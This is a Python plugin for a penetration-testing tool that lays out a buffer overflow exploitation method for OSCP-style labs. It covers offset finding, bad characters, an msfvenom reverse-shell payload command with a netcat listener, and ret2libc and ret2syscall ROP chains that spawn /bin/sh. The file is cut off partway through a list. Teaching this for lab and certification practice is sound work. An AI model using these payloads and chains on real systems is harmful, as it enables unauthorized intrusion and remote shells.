"""
Binary Exploitation service plugin

Generates methodology tasks for Windows/Linux buffer overflow exploitation including:
- Stack overflow analysis (offset finding, bad char detection)
- EIP/RIP control verification
- Protection analysis (ASLR, DEP, Stack Canary, SafeSEH)
- ret2win exploitation
- Stack shellcode injection
- SEH-based exploitation (Windows)
- Stack pivoting techniques
- ROP chain construction (ret2libc, ret2syscall, ret2csu, SROP)
- Shellcode generation and testing
- Pointer redirecting (string/function pointer overwriting)
- Uninitialized variable exploitation
- Windows VirtualAlloc DEP bypass (x64)

Extracted from HackTricks: binary-exploitation/stack-overflow/*
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class BinaryExploitationPlugin(ServicePlugin):
    """Buffer overflow exploitation methodology plugin for OSCP"""

    @property
    def name(self) -> str:
        return "binary-exploitation"

    @property
    def default_ports(self) -> List[int]:
        # Binary exploitation is file-based, not port-based
        # But we return common vulnerable service ports for detection
        return []

    @property
    def service_names(self) -> List[str]:
        # Will detect based on custom conditions, not service names
        return ['binary', 'executable', 'bof', 'buffer-overflow']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Binary exploitation is manually triggered, not auto-detected from port scans.
        Users will manually create tasks for binary analysis.

        Return False by default - this plugin is invoked manually.
        """
        # Check if explicitly marked for binary exploitation
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        # Detect if marked as vulnerable service or binary analysis
        return (
            'binary' in service or
            'executable' in service or
            'bof' in service or
            'buffer' in product or
            port_info.get('binary_analysis', False)
        )

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate buffer overflow exploitation methodology task tree"""
        version = service_info.get('version', '')
        binary_path = service_info.get('binary_path', '/path/to/binary')
        platform = service_info.get('platform', 'linux').lower()

        tasks = {
            'id': f'binary-exploit-methodology',
            'name': f'Buffer Overflow Exploitation Methodology',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Initial Analysis & Crash Discovery
        tasks['children'].append({
            'id': 'phase-1-discovery',
            'name': 'Phase 1: Crash Discovery & Initial Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': 'file-analysis',
                    'name': 'Binary File Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': f'file {binary_path}',
                        'description': 'Identify binary type, architecture, and basic properties',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'file': 'Determine file type and architecture (32/64-bit)'
                        },
                        'success_indicators': [
                            'ELF 32-bit or 64-bit identified',
                            'PE32 or PE32+ for Windows',
                            'LSB/MSB endianness noted',
                            'Dynamically linked or statically linked'
                        ],
                        'failure_indicators': [
                            'Not an executable',
                            'Corrupted file',
                            'Unsupported format'
                        ],
                        'next_steps': [
                            'Note architecture (x86/x64) for exploit development',
                            'Identify if stripped (affects debugging)',
                            'Check if statically linked (libc functions embedded)'
                        ],
                        'alternatives': [
                            f'readelf -h {binary_path} (Linux ELF)',
                            f'objdump -f {binary_path}',
                            'Manual: Check first bytes (ELF = 7f 45 4c 46, PE = 4d 5a)'
                        ],
                        'notes': '32-bit vs 64-bit changes register names (EIP/RIP, ESP/RSP) and calling conventions. Note platform for shellcode generation.'
                    }
                },
                {
                    'id': 'protection-analysis',
                    'name': 'Check Security Protections',
                    'type': 'command',
                    'metadata': {
                        'command': f'checksec --file={binary_path}',
                        'description': 'Identify enabled binary protections (NX, PIE, Canary, RELRO)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '--file': 'Analyze specific binary file for protections'
                        },
                        'success_indicators': [
                            'NX status (stack executable or not)',
                            'PIE status (ASLR for binary)',
                            'Stack Canary presence',
                            'RELRO status (GOT protection)',
                            'FORTIFY status'
                        ],
                        'failure_indicators': [
                            'checksec not installed',
                            'Binary format not recognized'
                        ],
                        'next_steps': [
                            'NX enabled: Cannot execute stack shellcode directly (need ROP)',
                            'PIE enabled: Addresses randomized (need leak)',
                            'Canary enabled: Must leak or bypass canary',
                            'No protections: Direct shellcode execution possible'
                        ],
                        'alternatives': [
                            f'readelf -l {binary_path} | grep GNU_STACK (NX check)',
                            f'readelf -h {binary_path} | grep Type (PIE check)',
                            'gdb: "info proc mappings" (runtime protection check)',
                            'Manual: strings binary | grep stack_chk (canary detection)'
                        ],
                        'notes': 'Windows: Check SafeSEH, ASLR, DEP via mona.py or PESecurity. No protections = ideal OSCP scenario.'
                    }
                },
                {
                    'id': 'fuzzing-crash',
                    'name': 'Fuzz for Crash',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 -c "print(\'A\'*1000)" | {binary_path}',
                        'description': 'Send large input to trigger buffer overflow crash',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            'print("A"*1000)': 'Generate 1000-byte pattern of As',
                            '|': 'Pipe output as stdin to binary'
                        },
                        'success_indicators': [
                            'Segmentation fault (SIGSEGV)',
                            'Access violation 0x41414141',
                            'Process crash with controlled EIP/RIP'
                        ],
                        'failure_indicators': [
                            'No crash (buffer too small or no vulnerability)',
                            'Program exits normally',
                            'Crash without 0x41... in EIP/RIP'
                        ],
                        'next_steps': [
                            'Verify crash is repeatable',
                            'Check if EIP/RIP contains 0x41414141',
                            'If crash but wrong address: adjust buffer size',
                            'Move to offset finding phase'
                        ],
                        'alternatives': [
                            f'(python3 -c "print(\'A\'*1000)"; cat) | nc {target} {port} (network service)',
                            'Manually send large input via application interface',
                            'Metasploit pattern_create.rb for unique pattern'
                        ],
                        'notes': 'Start with 1000 bytes. Increase if no crash (2000, 3000). Decrease if crash too early. Network services: send via socket.'
                    }
                }
            ]
        })

        # PHASE 2: Offset Discovery & EIP/RIP Control
        tasks['children'].append({
            'id': 'phase-2-control',
            'name': 'Phase 2: Find Offset & Control EIP/RIP',
            'type': 'parent',
            'children': [
                {
                    'id': 'generate-pattern',
                    'name': 'Generate Cyclic Pattern',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000',
                        'description': 'Create unique De Bruijn sequence to identify exact offset',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l': 'Length of pattern to generate (match crash buffer size)',
                            'pattern_create.rb': 'Metasploit tool for cyclic patterns'
                        },
                        'success_indicators': [
                            'Unique pattern generated',
                            'Pattern length matches crash buffer'
                        ],
                        'failure_indicators': [
                            'Tool not found (install metasploit-framework)'
                        ],
                        'next_steps': [
                            'Send pattern instead of As',
                            'Crash binary with pattern',
                            'Note EIP/RIP value from crash',
                            'Use pattern_offset to find offset'
                        ],
                        'alternatives': [
                            'pwntools: from pwn import *; cyclic(1000)',
                            'gdb-peda: pattern create 1000',
                            'gdb-gef: pattern create 1000',
                            'radare2: ragg2 -P 1000 -r'
                        ],
                        'notes': 'De Bruijn sequence ensures every 4-byte substring is unique. Critical for precise offset calculation.'
                    }
                },
                {
                    'id': 'find-offset',
                    'name': 'Calculate EIP/RIP Offset',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41414141',
                        'description': 'Find exact byte offset that overwrites EIP/RIP',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l': 'Pattern length used (must match pattern_create)',
                            '-q': 'Query value (EIP/RIP value from crash, little-endian)',
                            'pattern_offset.rb': 'Finds offset of substring in De Bruijn sequence'
                        },
                        'success_indicators': [
                            'Exact offset found (e.g., "Offset: 524")',
                            'Offset + 4 = buffer size to reach EIP'
                        ],
                        'failure_indicators': [
                            'Pattern not found (wrong length or wrong value)',
                            'Multiple matches (pattern too short)'
                        ],
                        'next_steps': [
                            'Test offset: "A"*offset + "BBBB" + "CCCC"',
                            'Verify EIP = 0x42424242 (BBBB)',
                            'Confirm control of 4 bytes after overflow',
                            'Move to bad character testing'
                        ],
                        'alternatives': [
                            'pwntools: cyclic_find(0x41414141)',
                            'gdb-peda: pattern search or pattern offset <addr>',
                            'gdb-gef: pattern search $eip',
                            'Manual: Calculate position in pattern string'
                        ],
                        'notes': 'Little-endian: If EIP shows "6c616162", query with 0x6261616c (reversed). 64-bit: Use 8-byte offsets (RIP).'
                    }
                },
                {
                    'id': 'verify-control',
                    'name': 'Verify EIP/RIP Control',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test precise control of instruction pointer with known values',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'next_steps': [
                            'Create exploit: "A"*offset + p32(0x42424242) + "C"*100',
                            'Send exploit and crash binary',
                            'Verify EIP = 0x42424242 in debugger',
                            'Check ESP/RSP points to Cs (shellcode space)',
                            'Note shellcode space size (how many Cs survive)',
                            'If ESP/RSP points to controllable data: good for shellcode',
                            'Document offset value for final exploit'
                        ],
                        'alternatives': [
                            'Test with different markers: "BBBB", "\\x42\\x42\\x42\\x42"',
                            'Verify ESP points to controlled buffer',
                            'Check stack layout in debugger'
                        ],
                        'notes': 'p32() = pack 32-bit little-endian. Use p64() for 64-bit. ESP/RSP should point near or into buffer for shellcode placement.'
                    }
                }
            ]
        })

        # PHASE 3: Bad Character Discovery
        tasks['children'].append({
            'id': 'phase-3-badchars',
            'name': 'Phase 3: Identify Bad Characters',
            'type': 'parent',
            'children': [
                {
                    'id': 'generate-badchars',
                    'name': 'Generate Bad Character Test String',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create byte array (0x01-0xFF) to test which characters break exploit',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Python: badchars = bytes(range(1, 256))',
                            'Exclude 0x00 by default (NULL terminates strings)',
                            'Send: "A"*offset + "BBBB" + badchars',
                            'Crash binary and inspect memory at ESP/RSP',
                            'Compare sent bytes vs received bytes in memory',
                            'Note any missing, truncated, or mangled bytes',
                            'Iteratively remove bad chars and retest'
                        ],
                        'alternatives': [
                            'mona.py: !mona bytearray -cpb "\\x00"',
                            'Manual hex string: \\x01\\x02\\x03...\\xff',
                            'Copy from HackTricks badchars template'
                        ],
                        'notes': 'Common bad chars: 0x00 (NULL), 0x0a (LF), 0x0d (CR), 0x20 (space). Services parsing strings often mangle these.'
                    }
                },
                {
                    'id': 'test-badchars',
                    'name': 'Test and Document Bad Characters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Iteratively identify all characters that corrupt the exploit',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Debugger: Follow ESP/RSP in memory dump',
                            'Compare badchar string with actual memory',
                            'If byte missing/changed: mark as bad character',
                            'Remove bad char from test string',
                            'Repeat until all bytes 01-FF present in memory',
                            'Document final bad char list: -b "\\x00\\x0a\\x0d"',
                            'Use bad char list for msfvenom shellcode generation'
                        ],
                        'alternatives': [
                            'mona.py: !mona compare -f bytearray.bin -a <ESP_address>',
                            'Manual: Hex compare tool (HxD, hexdump)',
                            'Python script to compare sent vs received bytes'
                        ],
                        'notes': 'Critical step! Bad chars in shellcode will break exploit. Common: 0x00 0x0a 0x0d 0x20. Network protocols add more.'
                    }
                }
            ]
        })

        # PHASE 4: Exploitation Strategy (Linux)
        if platform == 'linux':
            tasks['children'].append(self._generate_linux_exploitation_tasks(binary_path, version, service_info))
            # PHASE 5: Advanced Techniques (Linux + Windows only)
            tasks['children'].append(self._generate_advanced_techniques(binary_path, service_info))
        # PHASE 4: Exploitation Strategy (Windows)
        elif platform == 'windows':
            tasks['children'].append(self._generate_windows_exploitation_tasks(binary_path, version, service_info))
            # PHASE 5: Advanced Techniques (Linux + Windows only)
            tasks['children'].append(self._generate_advanced_techniques(binary_path, service_info))
        else:
            # Generic exploitation (no advanced phase for unknown platforms)
            tasks['children'].append(self._generate_generic_exploitation_tasks(binary_path, version, service_info))

        return tasks

    def _generate_linux_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux-specific exploitation tasks"""
        return {
            'id': 'phase-4-linux-exploit',
            'name': 'Phase 4: Linux Exploitation Strategy',
            'type': 'parent',
            'children': [
                {
                    'id': 'ret2win-linux',
                    'name': 'Ret2Win (Call Hidden Function)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Redirect execution to existing win/flag function in binary',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Find win function: objdump -d binary | grep win',
                            'Or: readelf -s binary | grep win',
                            'Or: gdb: info functions | grep win',
                            'Note win function address (e.g., 0x08048486)',
                            'Build exploit: "A"*offset + p32(win_addr)',
                            'If 64-bit and function needs params: add ROP gadgets',
                            'Send exploit and verify win function executes',
                            'Capture flag from output'
                        ],
                        'alternatives': [
                            'pwntools: elf = ELF("binary"); win = elf.symbols["win"]',
                            'radare2: afl | grep win (list functions)',
                            'ghidra/IDA: Search function names',
                            'Manual disassembly for function address'
                        ],
                        'notes': 'Requires: No PIE (or leak), No Stack Canary (or leak). 64-bit: may need params in RDI/RSI via ROP.'
                    }
                },
                {
                    'id': 'stack-shellcode-linux',
                    'name': 'Stack Shellcode Injection',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'check-nx',
                            'name': 'Verify Stack is Executable (NX disabled)',
                            'type': 'command',
                            'metadata': {
                                'command': f'readelf -l {binary_path} | grep GNU_STACK',
                                'description': 'Check if stack has execute permissions',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': [
                                    'RWE (Read Write Execute) permissions',
                                    'No NX enabled'
                                ],
                                'failure_indicators': [
                                    'RW- (no execute, NX enabled)',
                                    'Must use ROP/ret2libc instead'
                                ],
                                'next_steps': [
                                    'If NX disabled: Direct shellcode on stack viable',
                                    'If NX enabled: Skip to ROP/ret2libc methods',
                                    'Generate shellcode with msfvenom',
                                    'Find jump to ESP/RSP or use leaked stack address'
                                ],
                                'alternatives': [
                                    'checksec output (NX enabled/disabled)',
                                    'gdb: info proc mappings (check [stack] perms)',
                                    'At runtime: cat /proc/<PID>/maps | grep stack'
                                ],
                                'notes': 'Modern Linux: NX enabled by default. OSCP labs may have older binaries without NX.'
                            }
                        },
                        {
                            'id': 'generate-shellcode-linux',
                            'name': 'Generate Linux Shellcode',
                            'type': 'command',
                            'metadata': {
                                'command': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -b "\\x00\\x0a\\x0d"',
                                'description': 'Create reverse shell shellcode avoiding bad characters',
                                'tags': ['OSCP:HIGH'],
                                'flag_explanations': {
                                    '-p': 'Payload selection',
                                    'linux/x86/shell_reverse_tcp': 'Linux 32-bit reverse shell',
                                    'LHOST': 'Attacker IP for callback',
                                    'LPORT': 'Attacker listening port',
                                    '-f python': 'Output format as Python bytes',
                                    '-b': 'Bad characters to avoid (hex format)'
                                },
                                'success_indicators': [
                                    'Shellcode generated without errors',
                                    'Size <= available stack space',
                                    'No bad characters in output'
                                ],
                                'failure_indicators': [
                                    'Shellcode too large',
                                    'Cannot avoid bad characters (try different encoder)',
                                    'Payload not found'
                                ],
                                'next_steps': [
                                    '64-bit: Change to linux/x64/shell_reverse_tcp',
                                    'Note shellcode size (must fit in buffer)',
                                    'Add NOP sled before shellcode: "\\x90"*16 + shellcode',
                                    'Start listener: nc -nlvp <LPORT>',
                                    'Build exploit: "\\x90"*16 + shellcode + "A"*(offset-len(nop+sc)) + jmp_esp',
                                    'Send exploit'
                                ],
                                'alternatives': [
                                    'pwntools: shellcraft.sh() or shellcraft.linux.sh()',
                                    'Manual shellcode from shell-storm.org',
                                    'Custom assembly with nasm + objdump',
                                    'Try different encoder: -e x86/shikata_ga_nai'
                                ],
                                'notes': 'Shellcode size matters! Typical: 100-350 bytes. NOP sled increases reliability when jumping into shellcode area.'
                            }
                        },
                        {
                            'id': 'find-jmp-esp',
                            'name': 'Find JMP ESP Gadget',
                            'type': 'command',
                            'metadata': {
                                'command': 'ropper --file binary --search "jmp esp"',
                                'description': 'Locate gadget to jump to stack pointer (where shellcode resides)',
                                'tags': ['OSCP:HIGH'],
                                'flag_explanations': {
                                    '--file': 'Binary to search',
                                    '--search': 'Search for specific instruction',
                                    'jmp esp': 'Jump to stack pointer (x86), use "jmp rsp" for x64'
                                },
                                'success_indicators': [
                                    'JMP ESP address found (e.g., 0x08048abc)',
                                    'Address contains no bad characters',
                                    'Gadget in non-ASLR module'
                                ],
                                'failure_indicators': [
                                    'No JMP ESP found',
                                    'Address has bad characters',
                                    'PIE/ASLR makes address unreliable'
                                ],
                                'next_steps': [
                                    'Verify address has no bad chars',
                                    'Alternative: Find call esp, push esp; ret',
                                    'Build exploit: shellcode + padding + p32(jmp_esp_addr)',
                                    'When EIP hits JMP ESP: execution jumps to shellcode at ESP'
                                ],
                                'alternatives': [
                                    'ROPgadget: ROPgadget --binary binary --only "jmp"',
                                    'msf-nasm_shell: jmp esp → \\xff\\xe4',
                                    'objdump -d binary | grep "ff e4"',
                                    'Manual: Search for opcodes \\xff\\xe4 in binary'
                                ],
                                'notes': 'JMP ESP opcode: \\xff\\xe4 (x86). If ASLR: need leak. If no JMP ESP: try "call esp" or "push esp; ret".'
                            }
                        }
                    ]
                },
                {
                    'id': 'rop-linux',
                    'name': 'ROP (Return-Oriented Programming) Methodology',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'rop-basics',
                            'name': 'ROP Fundamentals & Gadget Discovery',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'find-rop-gadgets',
                                    'name': 'Find ROP Gadgets',
                                    'type': 'command',
                                    'metadata': {
                                        'command': f'ROPgadget --binary {binary_path}',
                                        'description': 'Discover ROP gadgets (code sequences ending in ret)',
                                        'tags': ['OSCP:HIGH', 'ROP'],
                                        'flag_explanations': {
                                            '--binary': 'Target binary to search for gadgets',
                                            'ROPgadget': 'Tool to find ROP gadgets in binaries'
                                        },
                                        'success_indicators': [
                                            'Gadgets listed with addresses',
                                            'pop reg; ret gadgets found (control registers)',
                                            'syscall or int 0x80 found (make syscalls)',
                                            'mov [reg], reg; ret (write-what-where)',
                                        ],
                                        'failure_indicators': [
                                            'No gadgets found (statically linked check)',
                                            'Insufficient gadgets for ROP chain'
                                        ],
                                        'next_steps': [
                                            'Identify useful gadgets: pop rdi/pop rsi/pop rdx; ret',
                                            'Find syscall or int 0x80 instruction',
                                            'Note addresses of gadgets without bad chars',
                                            'Build ROP chain strategy based on available gadgets'
                                        ],
                                        'alternatives': [
                                            f'ropper --file {binary_path} --search "pop r"',
                                            f'ropper --file {binary_path} --chain "execve"',
                                            'pwntools: from pwn import *; ROP(elf).find_gadget(["pop rdi", "ret"])',
                                            f'objdump -d {binary_path} | grep -E "(pop|ret)"'
                                        ],
                                        'notes': 'ROP bypasses NX/DEP by chaining existing code. x64: First 6 args in RDI,RSI,RDX,RCX,R8,R9. x86: Args on stack. ARM64: X0-X7 for args.'
                                    }
                                },
                                {
                                    'id': 'rop-gadget-types',
                                    'name': 'Understand Gadget Types',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Learn common ROP gadget patterns and usage',
                                        'tags': ['OSCP:HIGH', 'EDUCATIONAL'],
                                        'next_steps': [
                                            'pop reg; ret → Load stack value into register',
                                            'mov [reg1], reg2; ret → Write-what-where primitive',
                                            'syscall; ret or int 0x80; ret → Execute syscall',
                                            'jmp reg or call reg → Jump to register value',
                                            'xchg reg1, reg2; ret → Swap register values',
                                            'add/sub reg, val; ret → Arithmetic operations',
                                            'ret → Stack alignment (16-byte for x64 libc calls)',
                                            'leave; ret → Pivot stack (mov rsp, rbp; pop rbp)',
                                        ],
                                        'alternatives': [
                                            'Use pwntools ROP() class for automation',
                                            'Build manually with gadget addresses'
                                        ],
                                        'notes': 'Gadgets end in ret to chain execution. Each gadget performs small operation. Chain gadgets to build arbitrary functionality.'
                                    }
                                }
                            ]
                        },
                        {
                            'id': 'ret2libc',
                            'name': 'Ret2libc - Call libc Functions',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'ret2libc-find-system',
                                    'name': 'Find system() and /bin/sh',
                                    'type': 'command',
                                    'metadata': {
                                        'command': f'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E "system|execve"',
                                        'description': 'Locate system() function offset in libc',
                                        'tags': ['OSCP:HIGH', 'RET2LIBC'],
                                        'flag_explanations': {
                                            '-s': 'Show symbol table',
                                            'readelf': 'Display ELF file information',
                                            '/lib/x86_64-linux-gnu/libc.so.6': 'Standard libc location (64-bit)'
                                        },
                                        'success_indicators': [
                                            'system offset found (e.g., 0x00050d70)',
                                            '/bin/sh string offset found'
                                        ],
                                        'failure_indicators': [
                                            'libc not found (wrong path)',
                                            'Different libc version on target'
                                        ],
                                        'next_steps': [
                                            'Find /bin/sh: strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh',
                                            'Leak libc base address (via puts/write GOT)',
                                            'Calculate: system_addr = libc_base + system_offset',
                                            'Calculate: binsh_addr = libc_base + binsh_offset',
                                            'Build ROP chain: pop_rdi + binsh_addr + system_addr'
                                        ],
                                        'alternatives': [
                                            'ldd binary (show loaded libc)',
                                            'gdb: p system / find "/bin/sh"',
                                            'Use one_gadget for direct shell',
                                            'Manual: cat /proc/<PID>/maps | grep libc'
                                        ],
                                        'notes': 'x86: system addr + fake ret + arg. x64: pop rdi gadget + arg + system addr. ASLR: need libc leak first.'
                                    }
                                },
                                {
                                    'id': 'ret2libc-leak-address',
                                    'name': 'Leak libc Address (ASLR Bypass)',
                                    'type': 'parent',
                                    'children': [
                                        {
                                            'id': 'ret2plt-leak',
                                            'name': 'Ret2plt to Leak GOT Entry',
                                            'type': 'manual',
                                            'metadata': {
                                                'description': 'Call puts/write to leak GOT address of libc function',
                                                'tags': ['OSCP:HIGH', 'ASLR_BYPASS'],
                                                'next_steps': [
                                                    'Find PLT stub: objdump -d binary -M intel | grep puts@plt',
                                                    'Find GOT entry: objdump -R binary | grep puts',
                                                    'Build stage 1 ROP: pop_rdi + puts_got + puts_plt + main',
                                                    'Leak puts address from output',
                                                    'Identify libc: https://libc.blukat.me (use multiple leaks)',
                                                    'Calculate libc_base = leaked_puts - puts_offset',
                                                    'Build stage 2 ROP with real addresses',
                                                    'Return to vuln function to re-exploit'
                                                ],
                                                'alternatives': [
                                                    'Use printf format string to leak',
                                                    'Leak via partial overwrite (32-bit)',
                                                    'Use write() instead of puts()',
                                                    'Leak multiple GOT entries for precise libc ID'
                                                ],
                                                'notes': 'GOT contains runtime addresses. PLT stubs call GOT. ASLR randomizes libc base but offsets constant within libc version.'
                                            }
                                        },
                                        {
                                            'id': 'one-gadget',
                                            'name': 'Use One Gadget for Direct Shell',
                                            'type': 'command',
                                            'metadata': {
                                                'command': 'one_gadget /lib/x86_64-linux-gnu/libc.so.6',
                                                'description': 'Find single gadget that spawns shell (no args needed)',
                                                'tags': ['OSCP:MEDIUM', 'RET2LIBC'],
                                                'flag_explanations': {
                                                    'one_gadget': 'Tool to find magic gadgets in libc',
                                                    '/lib/x86_64-linux-gnu/libc.so.6': 'Target libc library'
                                                },
                                                'success_indicators': [
                                                    'One gadget offsets listed',
                                                    'Constraints shown (e.g., rax == NULL)'
                                                ],
                                                'failure_indicators': [
                                                    'No gadgets found (old libc)',
                                                    'Constraints not met at call time'
                                                ],
                                                'next_steps': [
                                                    'Note gadget offset and constraints',
                                                    'Check if constraints naturally met',
                                                    'Calculate: one_gadget_addr = libc_base + offset',
                                                    'Jump to one_gadget instead of system()',
                                                    'If constraints fail, try different gadget'
                                                ],
                                                'alternatives': [
                                                    'Install: gem install one_gadget',
                                                    'Manual: Search for execve("/bin/sh") sequences',
                                                    'Use traditional system("/bin/sh") if one_gadget fails'
                                                ],
                                                'notes': 'One gadgets = magic addresses in libc that spawn shell. Constraints must be met (register values). Saves ROP chain complexity.'
                                            }
                                        }
                                    ]
                                },
                                {
                                    'id': 'ret2libc-32bit',
                                    'name': 'Ret2libc x86 (32-bit) Example',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Build 32-bit ret2libc calling system("/bin/sh")',
                                        'tags': ['OSCP:HIGH', 'RET2LIBC', 'X86'],
                                        'next_steps': [
                                            'ROP chain layout (x86):',
                                            '  padding + system_addr + fake_return + binsh_addr',
                                            'Example:',
                                            '  payload = "A" * offset',
                                            '  payload += p32(system_addr)  # EIP points here',
                                            '  payload += p32(0xdeadbeef)   # Fake return address',
                                            '  payload += p32(binsh_addr)   # First arg on stack',
                                            'On ret: ESP -> fake_return (ignored), ESP+4 -> arg',
                                            'system() reads arg from [ESP+4]',
                                            'Executes /bin/sh'
                                        ],
                                        'alternatives': [
                                            'Use ROP chain to call execve syscall instead',
                                            'Chain multiple functions (open→read→write)',
                                            'Use environment variables for /bin/sh'
                                        ],
                                        'notes': 'x86 uses stack for arguments. First arg at ESP+4 after call. Fake return can be exit() to clean exit.'
                                    }
                                },
                                {
                                    'id': 'ret2libc-64bit',
                                    'name': 'Ret2libc x64 (64-bit) Example',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Build 64-bit ret2libc calling system("/bin/sh")',
                                        'tags': ['OSCP:HIGH', 'RET2LIBC', 'X64'],
                                        'next_steps': [
                                            'ROP chain layout (x64):',
                                            '  padding + pop_rdi_ret + binsh_addr + ret + system_addr',
                                            'Example:',
                                            '  payload = "A" * offset',
                                            '  payload += p64(pop_rdi_ret)  # Gadget to set RDI',
                                            '  payload += p64(binsh_addr)   # RDI = "/bin/sh"',
                                            '  payload += p64(ret_gadget)   # Stack alignment (16-byte)',
                                            '  payload += p64(system_addr)  # Call system()',
                                            'pop rdi sets first argument',
                                            'ret aligns stack for libc (movaps requirement)',
                                            'system() executes with RDI pointing to /bin/sh'
                                        ],
                                        'alternatives': [
                                            'Use pwntools: rop.call("system", [binsh_addr])',
                                            'Call execve instead of system',
                                            'Use ret2csu to control RDI/RSI/RDX'
                                        ],
                                        'notes': 'x64 uses registers for args (RDI, RSI, RDX, RCX, R8, R9). Stack must be 16-byte aligned before libc calls. Add extra ret for alignment.'
                                    }
                                }
                            ]
                        },
                        {
                            'id': 'ret2syscall',
                            'name': 'Ret2syscall - Direct Syscall Execution',
                            'type': 'parent',
                            'children': [
                                {
                                    'id': 'ret2syscall-basics',
                                    'name': 'Understand Syscall Method',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Execute system calls without libc functions',
                                        'tags': ['OSCP:HIGH', 'RET2SYSCALL'],
                                        'next_steps': [
                                            'Syscall approach: Set registers + call syscall instruction',
                                            'x64 syscall (execve syscall #59):',
                                            '  RAX = 59 (syscall number)',
                                            '  RDI = address of "/bin/sh"',
                                            '  RSI = 0 (argv pointer, NULL)',
                                            '  RDX = 0 (envp pointer, NULL)',
                                            '  Execute: syscall instruction',
                                            'x86 (int 0x80) execve (syscall #11):',
                                            '  EAX = 11 (syscall number)',
                                            '  EBX = address of "/bin/sh"',
                                            '  ECX = 0 (argv)',
                                            '  EDX = 0 (envp)',
                                            '  Execute: int 0x80',
                                            'Useful for statically linked binaries with many gadgets'
                                        ],
                                        'alternatives': [
                                            'Use ret2libc if available',
                                            'Use SROP if lacking gadgets',
                                            'Call mprotect to make stack executable'
                                        ],
                                        'notes': 'Bypasses need for libc. Requires: write primitive, pop gadgets, syscall/int 0x80 instruction. Common in static binaries.'
                                    }
                                },
                                {
                                    'id': 'write-binsh-memory',
                                    'name': 'Write /bin/sh to Memory',
                                    'type': 'command',
                                    'metadata': {
                                        'command': f'readelf -S {binary_path} | grep -E "\\.bss|\\.data"',
                                        'description': 'Find writable memory section for /bin/sh string',
                                        'tags': ['OSCP:HIGH', 'RET2SYSCALL'],
                                        'flag_explanations': {
                                            '-S': 'Display section headers',
                                            'readelf': 'Read ELF file structure',
                                            '.bss': 'Uninitialized data section (writable)',
                                            '.data': 'Initialized data section (writable)'
                                        },
                                        'success_indicators': [
                                            'Writable section found (flags contain W)',
                                            'Address noted (e.g., 0x6b6000)'
                                        ],
                                        'failure_indicators': [
                                            'No writable sections (rare)',
                                            'Address contains bad characters'
                                        ],
                                        'next_steps': [
                                            'Find write-what-where gadget: ROPgadget --binary binary | grep "mov.*ptr"',
                                            'Common: mov [rax], rdx; ret or mov [rdi], rsi; ret',
                                            'Build write chain:',
                                            '  pop rdx + "/bin/sh\\x00"',
                                            '  pop rax + writable_addr',
                                            '  mov [rax], rdx + ret',
                                            'Now writable_addr contains "/bin/sh"'
                                        ],
                                        'alternatives': [
                                            'Use existing /bin/sh in binary or libc',
                                            'Write via read() syscall: call read(0, bss, 8)',
                                            'Use environment variables (SHELL=/bin/sh)'
                                        ],
                                        'notes': 'x64: Write 8 bytes at once. x86: Write 4 bytes, need 2 writes for "/bin/sh\\x00".'
                                    }
                                },
                                {
                                    'id': 'ret2syscall-chain',
                                    'name': 'Build Ret2syscall ROP Chain',
                                    'type': 'manual',
                                    'metadata': {
                                        'description': 'Construct complete ret2syscall chain',
                                        'tags': ['OSCP:HIGH', 'RET2SYSCALL'],
                                        'next_steps': [
                                            'Find gadgets needed:',
                                            '  pop rax; ret (or pop eax; ret)',
                                            '  pop rdi; ret (or pop ebx; ret)',
                                            '  pop rsi; ret (or pop ecx; ret)',
                                            '  pop rdx; ret (or pop edx; ret)',
                                            '  syscall; ret (or int 0x80; ret)',
                                            'Build x64 chain:',
                                            '  "A" * offset',
                                            '  pop_rax + p64(59)',
                                            '  pop_rdi + p64(binsh_addr)',
                                            '  pop_rsi + p64(0)',
                                            '  pop_rdx + p64(0)',
                                            '  syscall_ret',
                                            'Auto-generate: ROPgadget --binary binary --ropchain',
                                            'Test in gdb before sending'
                                        ],
                                        'alternatives': [
                                            'pwntools automation: rop.execve(binsh_addr, 0, 0)',
